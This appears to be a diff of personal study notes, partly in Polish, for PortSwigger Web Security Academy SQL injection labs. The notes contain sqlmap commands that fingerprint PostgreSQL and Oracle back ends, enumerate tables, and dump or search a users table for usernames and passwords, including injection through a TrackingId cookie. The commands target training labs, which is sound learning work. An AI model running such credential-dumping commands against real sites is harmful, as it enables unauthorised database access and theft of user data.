@@ -13,17 +13,25 @@ Flagi:
 - AND must be type boolean czyli AND CAST zamieniam ma AND 1=CAST
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 
-5. SQL injection attack, listing the database contents on non-Oracle databases
 
-
-case:
+case: PostgreSQL (deafultoa tabela -T public)
 sqlmap -u "https://0a4b009904f25e948465aef8007300cd.web-security-academy.net/filter?category=Gifts" --cookie="session=etWQ5Ql297sJYh0a3cOl7V4H5BWSXyx1o" --batch --random-agent --risk=3 --level=3
 sqlmap -u "https://0a4b009904f25e948465aef8007300cd.web-security-academy.net/filter?category=Gifts" --cookie="session=etWQ5Ql297sJYh0a3cOl7V4H5BWSXyx1o" --batch --random-agent --risk=3 --level=3 --fingerprint
 sqlmap -u "https://0a4b009904f25e948465aef8007300cd.web-security-academy.net/filter?category=Gifts" --cookie="session=etWQ5Ql297sJYh0a3cOl7V4H5BWSXyx1o" --batch --random-agent --risk=3 --level=3 --dbms=PostgreSQL -D public --tables
 sqlmap -u "https://0a4b009904f25e948465aef8007300cd.web-security-academy.net/filter?category=Gifts" --cookie="session=etWQ5Ql297sJYh0a3cOl7V4H5BWSXyx1o" --batch --random-agent --risk=3 --level=3 --dbms=PostgreSQL -D public -T users --dump
   
 
+case2: Oracle
+sqlmap -u "https://0a27008f0364b9dc8052303800de00f7.web-security-academy.net/filter?category=Pets" --cookie="TrackingId=WhuoqCWoCNZSvtI0; session=OVkAizmz73JjCcfzt4JSnBAhudcSoGKA" --batch  --random-agent --risk=3 --level=3 -p TrackingId
+sqlmap -u "https://0a27008f0364b9dc8052303800de00f7.web-security-academy.net/filter?category=Pets" --cookie="TrackingId=WhuoqCWoCNZSvtI0; session=OVkAizmz73JjCcfzt4JSnBAhudcSoGKA" --batch  --random-agent --risk=3 --level=3 -p TrackingId --dbms=Oracle
+sqlmap -u "https://0a27008f0364b9dc8052303800de00f7.web-security-academy.net/filter?category=Pets" --cookie="TrackingId=WhuoqCWoCNZSvtI0; session=OVkAizmz73JjCcfzt4JSnBAhudcSoGKA" --batch --random-agent --risk=3 --level=3 -p TrackingId --dbms=Oracle --technique=B --search -T users -C username,password
 
+
+
+
+
+ 
+5. SQL injection attack, listing the database contents on non-Oracle databases
 
 
 --schema (enumerates database schema (databases, tables, columns)) 
